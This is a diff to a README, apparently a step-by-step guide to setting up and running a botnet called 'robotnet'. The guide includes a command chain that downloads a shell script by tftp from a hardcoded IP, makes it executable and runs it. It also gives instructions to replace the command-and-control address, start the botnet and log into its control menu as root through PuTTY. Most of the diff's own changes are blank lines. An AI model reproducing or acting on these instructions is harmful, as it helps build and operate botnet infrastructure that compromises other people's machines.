@@ -7,12 +7,20 @@ git clone https://github.com/robotikmaniac/robotnet
 
 
 
+
+
+
+
 dir  (This should be under robotnet)
 cd robotnet
 PACKAGES SHOULD INCLUDE
 CC7.py    <<   python
 CLIENT.C  <<   C++
 server.C  <<   C++
+
+
+
+
 
 
 PREP FOR BOTNET
@@ -29,7 +37,15 @@ tftp -r tftp1.sh -g 94.177.230.28; chmod 777 tftp1.sh; sh tftp1.sh; ftpget -v -u
 
 )))))))))))
 
-EDIT THE IP 
+
+
+
+
+
+
+
+
+(EDIT THE IP)
  LINE 224     ===   94.177.230.28:812  (change to)  {{  "your ip":23    }}
  
  MAKE SURE WHEN YOU EDIT THE IP'S CORRECT on one of the lines theres a IP thats looks LIKE 94.177.230.2
@@ -40,6 +56,15 @@ EDIT THE IP
  if the ip looks like 94.177.230.2   make it look like 192.168.1.72
  
  after you have done all of that
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
  
  
  
@@ -79,10 +104,27 @@ EDIT THE IP
  sudo apt-get install unzip            
  (JUST DO IT IT MIGHT HAVE A NEW VERSION)
  
+ 
+ 
+ 
+ 
+ 
+ 
  THOSE ARE ALL THE PACKAGES YOU NEED AFTER THAT I DO RECOMEND DOING
  sudo apt-get update     (DO THIS)
  sudo apt-get upgrade
  sudo apt-get update     (yes i typed this again on perpose)
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
  
  (RUNNING THE BOTNET)
  
@@ -104,6 +146,12 @@ IF IT HAS A BLACK SCREEN THE BOTNET IS PORT FOWWARDING
 
 
 
+
+
+
+
+
+
 (CONNECT TO THE BOTNET)
 GO INTO PUTTY then type your (IP OF CHOICE)
 SELECT A RAW CONNECTON TYPE 
@@ -121,6 +169,12 @@ THEN use
 username root
 password of your choice
 you should be greeted to a menu with the rules of the server 
+
+
+
+
+
+
 
 
 
